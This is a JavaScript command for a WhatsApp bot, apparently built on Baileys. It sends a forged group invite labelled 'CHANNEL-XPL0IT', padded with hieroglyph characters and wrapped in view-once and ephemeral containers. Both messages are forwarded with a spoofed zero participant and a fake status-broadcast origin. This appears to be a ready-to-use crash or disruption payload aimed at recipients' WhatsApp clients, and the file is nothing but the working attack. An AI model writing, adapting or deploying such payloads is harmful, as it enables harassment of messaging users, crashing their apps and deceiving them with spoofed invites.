let handler = async (m, { conn }) => {
  const OWNER_NUMBER = conn.user.jid;

  if (m.sender !== OWNER_NUMBER) {
    return conn.reply(m.chat, '🚫 Solo el bot puede usar este comando.', m);
  }

  const inviteCode = 'CHANNEL-XPL0IT-𓂀𓂀𓂀𓂀'; // Tamaño reducido
  const groupName = '🔥 Canal Oficial ⚠️';
  const channelJid = '120363999999999999@g.us';
  const thumbnailFake = Buffer.from(
    // Imagen JPEG en base64 de 1x1 píxel (válida)
    '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEB'
    + 'AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wAALCAABAAEBAREA/8QAFQABAQAAAAAAAAAA'
    + 'AAAAAAAf/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAAH/xAAUEQEAAAAAAAAAAA'
    + 'AAAAAAAAAA/9oACAEBAAEFAq//xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oACAEDAQE/AR//xAAUEQ'
    + 'EAAAAAAAAAAAAAAAAAAAAA/9oACAECAQE/AR//xAAUEAEAAAAAAAAAAAAAAAAAAAAA/9oACAEBA'
    + 'AY/Av/EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQEAAT8h/9k=',
    'base64'
  );

  const fakeInviteContent = {
    groupJid: channelJid,
    inviteCode,
    groupName,
    jpegThumbnail: thumbnailFake
  };

  const viewOnceWrapper = {
    viewOnceMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  const ephemeralWrapper = {
    ephemeralMessage: {
      message: {
        groupInviteMessage: fakeInviteContent
      }
    }
  };

  await conn.sendMessage(m.chat, {
    forward: {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: viewOnceWrapper
    }
  });

  await conn.sendMessage(m.chat, {
    forward: {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: ephemeralWrapper
    }
  });

  await conn.reply(m.chat, '✅ Mensaje enviado.', m);
};
